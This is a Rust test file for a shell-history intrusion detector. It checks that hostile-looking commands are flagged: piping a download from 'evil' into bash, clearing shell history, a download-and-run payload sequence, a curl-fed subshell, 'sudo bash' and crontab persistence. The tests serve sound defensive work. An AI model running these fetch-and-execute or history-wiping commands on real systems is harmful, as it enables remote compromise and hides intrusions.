mod common;

use basket::ids::detect_intrusions;
use basket::storage::db::{CommandStatus, Entry};

fn entry(ts: i64, cmd: &str) -> Entry {
    Entry {
        id: "id".to_string(),
        timestamp: ts,
        command: cmd.to_string(),
        date: "2024-01-01 00:00:00".to_string(),
        status: CommandStatus::Unknown,
        user: "tester".to_string(),
    }
}

#[test]
fn flags_pipe_to_shell() {
    let _guard = common::env_lock();
    let entries = vec![entry(1, "curl https://evil | bash")];
    let findings = detect_intrusions(&entries);
    assert!(!findings.is_empty());
    assert!(findings[0].reasons.iter().any(|r| r.contains("pipe")));
}

#[test]
fn flags_history_tamper() {
    let _guard = common::env_lock();
    let entries = vec![entry(1, "history -c")];
    let findings = detect_intrusions(&entries);
    assert!(!findings.is_empty());
    assert!(findings[0].reasons.iter().any(|r| r.contains("history")));
}

#[test]
fn detects_recon_download_exec_sequence() {
    let _guard = common::env_lock();
    let entries = vec![
        entry(10, "nmap -sV 127.0.0.1"),
        entry(20, "curl http://example.com/payload.sh -o /tmp/p.sh"),
        entry(30, "bash /tmp/p.sh"),
    ];
    let findings = detect_intrusions(&entries);
    assert!(findings
        .iter()
        .any(|f| f.reasons.iter().any(|r| r.contains("sequence"))));
}

#[test]
fn allowlist_skips_matching_commands() {
    let _guard = common::env_lock();
    let config_path = std::path::Path::new("ids_config.json");
    let original = std::fs::read_to_string(config_path).expect("read config");
    std::fs::write(
        config_path,
        r#"{"suppress_rules":[],"allowlist_commands":["curl"]}"#,
    )
    .expect("write config");

    let entries = vec![entry(1, "curl https://example.com | bash")];
    let findings = detect_intrusions(&entries);
    assert!(findings.is_empty());

    std::fs::write(config_path, original).expect("restore config");
}

#[test]
fn suppression_removes_matched_rules() {
    let _guard = common::env_lock();
    let config_path = std::path::Path::new("ids_config.json");
    let original = std::fs::read_to_string(config_path).expect("read config");
    std::fs::write(
        config_path,
        r#"{"suppress_rules":["priv.esc","priv.shell"],"allowlist_commands":[]}"#,
    )
    .expect("write config");

    let entries = vec![entry(1, "sudo bash")];
    let findings = detect_intrusions(&entries);
    assert!(findings.is_empty());

    std::fs::write(config_path, original).expect("restore config");
}

#[test]
fn classifies_service_user() {
    let _guard = common::env_lock();
    let mut entry = entry(1, "whoami");
    entry.user = "root".to_string();
    let findings = detect_intrusions(&[entry]);
    assert!(!findings.is_empty());
    assert_eq!(findings[0].user_type, "service");
}

#[test]
fn flags_persistence_and_recon() {
    let _guard = common::env_lock();
    let entries = vec![entry(1, "crontab -e"), entry(2, "uname -a")];
    let findings = detect_intrusions(&entries);
    assert!(findings
        .iter()
        .any(|f| f.reasons.iter().any(|r| r.contains("persistence"))));
    assert!(findings
        .iter()
        .any(|f| f.reasons.iter().any(|r| r.contains("recon"))));
}

#[test]
fn flags_lolbin_and_remote_exec() {
    let _guard = common::env_lock();
    let entries = vec![
        entry(1, "python -c 'print(1)'"),
        entry(2, "bash -c \"$(curl http://example.com)\""),
    ];
    let findings = detect_intrusions(&entries);
    assert!(findings
        .iter()
        .any(|f| f.reasons.iter().any(|r| r.contains("lolbin"))));
    assert!(findings
        .iter()
        .any(|f| f.reasons.iter().any(|r| r.contains("subshell"))));
}

#[test]
fn detects_sudo_shell_sequence() {
    let _guard = common::env_lock();
    let entries = vec![entry(10, "sudo ls"), entry(20, "bash")];
    let findings = detect_intrusions(&entries);
    assert!(findings
        .iter()
        .any(|f| f.reasons.iter().any(|r| r.contains("sudo"))));
}

#[test]
fn skips_empty_commands() {
    let _guard = common::env_lock();
    let entries = vec![entry(1, ""), entry(2, "   ")];
    let findings = detect_intrusions(&entries);
    assert!(findings.is_empty());
}

#[test]
fn uses_current_user_when_entry_user_missing() {
    let _guard = common::env_lock();
    let mut entry = entry(1, "history -c");
    entry.user = String::new();
    let expected = std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .unwrap_or_else(|_| "unknown".to_string());
    let findings = detect_intrusions(&[entry]);
    assert_eq!(findings[0].user, expected);
}
